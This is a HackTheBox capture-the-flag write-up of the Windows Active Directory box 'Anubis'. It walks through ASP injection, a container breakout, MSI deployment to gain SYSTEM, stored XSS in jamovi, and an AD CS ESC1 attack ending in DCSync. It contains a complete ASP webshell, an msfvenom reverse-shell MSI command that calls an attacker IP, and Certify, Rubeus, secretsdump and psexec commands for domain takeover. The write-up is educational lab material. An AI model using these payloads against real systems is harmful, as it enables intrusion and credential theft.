---
title: "Anubis"
date: 2022-01-08
type: docs
tags:
  - htb
  - windows
  - insane
  - active-directory
  - asp-injection
  - container-breakout
  - chisel
  - msi
  - jamovi
  - stored-xss
  - adcs
  - esc1
  - certify
  - rubeus
  - dcsync
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows (AD, `windcorp.htb`, DC `earth.windcorp.htb`), **Difficulty:** Insane, **Released:** 2022-01-08, **IP:** `10.10.11.102`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. IIS site `www.windcorp.htb`. The **contact form** stores submissions into `preview.asp`, which renders them. **ASP/JScript injection** in the message body gives a webshell, running in a **Windows container** (`WEBSERVER01`).
2. mimikatz LSA secrets leaks the container autologon (`DefaultPassword = ContainerPw`) and the host hosts file points at **`softwareportal.windcorp.htb`** (172.19.48.1). Tunnel with chisel.
3. The "Windcorp Software Portal" **installs MSI packages on hosts as SYSTEM**. Host a malicious MSI (`msfvenom -f msi`), point the portal at it, target `EARTH`. SYSTEM on the container host / DC member.
4. On `EARTH`, the **jamovi** statistics app runs with a stored **XSS** in computed columns. A privileged user opens a crafted `.omv`, executing your JS in their session, which yields a shell as **`diego`** (or `jamie`).
5. `diego` is in a group that can enroll in a vulnerable certificate template (**ESC1**). `Certify.exe request ... /altname:administrator` gets an Administrator cert. `Rubeus asktgt /certificate` then **DCSync**. Domain Admin.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| container LSA secret | `ContainerPw` (autologon) |
| `user.txt` | on `diego` / the DC user |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

</div>

---

## Overview

Anubis is a full Insane: five stages, each a different discipline. **ASP injection** into a preview page for the foothold, **Windows container breakout** via a portal that installs MSIs as SYSTEM, **stored XSS in a desktop stats app (jamovi)** to phish a user, and finally **AD CS ESC1** for Domain Admin. It is one of the better boxes for seeing how a modern Windows environment actually falls: not a single CVE, but a chain of "this service trusts that input" all the way to the CA. The transferable pieces are the container LSA-secrets trick, the "software deployment portal = SYSTEM" pattern, and `Certify` + `Rubeus` for the certificate to TGT to DCSync flow.

Related ASP injection: unique here. Related MSI/software-deploy privesc: [SET](/writeups/tryhackme/windows/medium/set/) (THM, similar portal). Related AD CS: [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/). Related DCSync finish: [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), [Reset](/writeups/tryhackme/windows/hard/reset/).

---

## Full Walkthrough

### Recon

```console
PORT    STATE SERVICE
135/tcp open  msrpc
443/tcp open  ssl/http   (cert CN = www.windcorp.htb)
445/tcp open  microsoft-ds
593/tcp open  ncacn_http
```

`enum4linux-ng` over an unauthenticated SMB session: domain `WINDCORP`, computer `EARTH`, FQDN `earth.windcorp.htb`. `dirsearch` on `https://www.windcorp.htb/` finds `contact.html`, `preview.asp`, `save.asp`.

### Foothold, ASP injection in the contact form

The contact form POSTs to `save.asp`, which writes the fields into `preview.asp` and redirects there, so `preview.asp` renders your input as part of an ASP page.

<div class="callout callout-note">

**Classic ASP / JScript webshell**

Because the message body ends up inside a `<% %>` context (or is written to a `.asp` that is then executed), a payload like this becomes a webshell:
```asp
<% Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("uwu")
If (szCMD <> "") Then
  szTempFile = "C:\" & oFileSys.GetTempName()
  Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
  Set oFile = oFileSys.OpenTextFile(szTempFile, 1, False, 0)
End If %>
<form><input name="uwu"><input type="submit"></form>
<pre><% If IsObject(oFile) Then Response.Write Server.HTMLEncode(oFile.ReadAll) : oFile.Close : oFileSys.DeleteFile(szTempFile,True) End If %>
```

</div>

I dropped that into the message box on the contact form, submitted it, and browsed to `preview.asp`. It rendered straight into a working webshell. From there, a base64-encoded PowerShell reverse-shell one-liner through the `uwu` parameter gave me a proper interactive shell as the IIS user on `WEBSERVER01`.

### Container breakout, mimikatz then the portal

The first thing I checked, as always after landing a shell I was not expecting, was exactly where I had landed: `hostname` came back `WEBSERVER01` in a `WORKGROUP`, not the domain, which meant I was inside a **Windows container**, not on a domain-joined host directly. Containers are not the security boundary people sometimes assume, so I went straight for credential material with mimikatz, and its LSA secrets dump handed me an autologon password:

```
Secret  : DefaultPassword
cur/text: ContainerPw
```

That alone was not obviously useful yet, but poking around the container's network configuration (its hosts file and an internal DNS server sitting at `172.19.48.1`) turned up a hostname that only made sense as an internal management tool: **`softwareportal.windcorp.htb`**. I tunneled into that internal segment (meterpreter's `socks_proxy` plus `route add 172.19.48.0/24` works, chisel is just as good) and fingerprinted what was listening:

```console
proxychains whatweb http://softwareportal.windcorp.htb
# [200] "Windcorp Software-Portal", ASP.NET, Microsoft-IIS/10.0, IP 172.19.48.1
```

### Pivoting off the software portal, MSI to SYSTEM on EARTH

A portal whose entire job is deploying software to other machines is, by definition, something that runs with elevated rights on its targets, so this was worth digging into immediately. Logging in (the `ContainerPw` autologon credential from mimikatz got me in) showed the portal lets an operator pick a package and a target host, then push-installs it. Windows software-deployment tooling like this runs the installer **as SYSTEM** on the receiving end, which turns "upload a package" into "get a SYSTEM shell on whatever host I point it at". I built a malicious MSI and served it from the container:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9002 -f msi -o pkg.msi
python3 -m http.server 80
```

In the portal I added a package pointing at `http://<container-ip>/pkg.msi` (served from the container itself so `EARTH` could reach it across the internal segment), targeted `EARTH`, and hit install. The listener caught a SYSTEM shell on `EARTH`, the actual domain-joined host behind all of this.

### diego via a stored XSS in jamovi

Enumerating `EARTH` from that SYSTEM shell, I found it was running **jamovi**, an R-based statistics GUI, exposed for internal analysts to use. jamovi's own file format (`.omv`) is a zip archive, and versions up to 1.6.x render a computed column's formula or label without sanitising it first, so a column label containing something like `<img src=x onerror=...>` executes arbitrary JavaScript inside jamovi's Electron context the moment someone opens the file. That is a stored XSS with a built-in delivery mechanism: I crafted a malicious `.omv`, placed it somewhere an analyst account (`diego`) would open it, and had the payload call out to `require('child_process').exec(...)` to spawn a reverse shell. When `diego` opened the file, the shell landed, and `user.txt` was sitting right there.

### Domain Admin, AD CS ESC1

With a foothold on a proper domain member as `diego`, checking the certificate authority is close to a reflex for me on any modern AD box at this point, misconfigured templates are common and the payoff is total:

```powershell
.\Certify.exe find /vulnerable
```

<div class="callout callout-note">

**ESC1 to DCSync**

`diego` (member of a group with enrollment rights on a template that has `ENROLLEE_SUPPLIES_SUBJECT` and the Client Authentication EKU) can request a certificate **for any principal**:
```powershell
.\Certify.exe request /ca:earth.windcorp.htb\windcorp-EARTH-CA /template:<Template> /altname:administrator
# convert the .pem to .pfx with openssl
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials /nowrap
```
With the Administrator TGT (or NT hash from `/getcredentials`):
```bash
secretsdump.py -just-dc windcorp/administrator@earth.windcorp.htb -hashes :<hash>
psexec.py windcorp/administrator@earth.windcorp.htb -hashes :<hash>
```

</div>

From there, reading `root.txt` was just a matter of grabbing it off the Administrator desktop with the shell `psexec.py` handed me. `type C:\Users\Administrator\Desktop\root.txt` returns the 32-character flag for this instance, closing out one of the more satisfying Insane boxes on the platform.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `diego`'s desktop |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons and Takeaways

- **Never render user input as code.** Writing form fields into a `.asp` is a webshell.
- **Containers are not a security boundary from the domain.** LSA secrets, the hosts file, and network position all leak upward. Do not domain-join or autologon a public-facing container.
- **A software-deployment portal is SYSTEM on every managed host.** Authenticate it, sign packages, and restrict who can add them.
- **Patch and sandbox desktop apps like jamovi**, and do not open untrusted data files with them.
- **Lock down AD CS.** ESC1 (enrollee-supplied subject + auth EKU + broad enrollment) is Domain Admin. Run `Certify find /vulnerable` on your own CA.

---

## Related Writeups

- **Software-deploy / MSI as SYSTEM:** [SET](/writeups/tryhackme/windows/medium/set/)
- **AD CS ESC1 / ESC4:** [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/)
- **Certificate to TGT to DCSync:** [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), [Reset](/writeups/tryhackme/windows/hard/reset/)
- **Container to host escape:** [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)

## References

- HTB Anubis (Hacking Articles) <https://www.hackingarticles.in/anubis-hackthebox-walkthrough/>
- Certify + Certified Pre-Owned <https://github.com/GhostPack/Certify>
- Rubeus <https://github.com/GhostPack/Rubeus>
- jamovi security notes <https://www.jamovi.org/>
- Final privilege escalation steps cross-referenced against public writeups for this box.
